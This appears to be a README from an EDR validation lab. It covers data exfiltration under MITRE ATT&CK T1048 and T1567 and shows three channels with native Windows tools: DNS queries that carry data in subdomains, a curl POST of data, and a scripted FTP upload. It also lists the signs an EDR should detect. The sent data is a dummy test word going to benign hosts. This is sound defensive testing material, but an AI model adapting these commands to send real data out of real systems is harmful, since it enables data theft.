# 14. Data Exfiltration

[Portugues](../../14-exfiltracao/README.md) | **English**

**MITRE ATT&CK tactic:** Exfiltration
**IDs:** T1048.003, T1048, T1567
**Expected severity:** High
**Needs admin:** No
**Destructive:** No

This folder shows three exfiltration channels, all with native Windows tools. The data sent is fake, just the word teste, only to generate the data egress behavior. No real information leaves the machine.

## What it is for, from the attacker point of view

After finding what they want, for example documents, passwords or databases, the attacker needs to get it out of the company without being noticed. They hide the data inside traffic that looks normal, such as DNS queries or an ordinary web request.

## Why it is dangerous

Exfiltration is the theft itself, the moment the information leaves the company. It is the part that causes the direct damage, the data leak, the privacy law fine, the loss of a trade secret. And it often goes unnoticed, because it travels disguised as legitimate traffic. Detecting data leaving through unusual channels is one of the most important validations.

## Analogy

The burglar has already set the jewels aside. Now they need to get them out of the building. Instead of walking out with a flashy bag, they hide each jewel inside ordinary letters and drop them one by one in the mailbox, with no one noticing.

## The three channels shown

### Channel 1, DNS (T1048.003)

Hides data inside queried domain names. Each query carries a piece of the information.

```cmd
nslookup dados-teste-01.example.com
nslookup dados-teste-02.example.com
```

### Channel 2, HTTP (T1567)

Sends data in a web request, using curl.exe that already ships with Windows 10 and 11.

```cmd
curl.exe -s -X POST -d "dados=teste" https://httpbin.org/post
```

### Channel 3, FTP (T1048)

Uses the native FTP client with an automated script to send a file.

```cmd
ftp -s:roteiro-ftp.txt
```

## What the EDR should detect

* An unusual volume of DNS queries with strange names, a possible DNS tunnel.
* Data sent over HTTP from a command line tool.
* An outbound FTP connection started by a script.
* Classification as Exfiltration, high severity.

## Prerequisites

* Internet access on the test VM, for the HTTP and DNS channels.

## Cleanup

* The script deletes the temporary files it creates, for example the FTP script. Nothing else is left on disk.
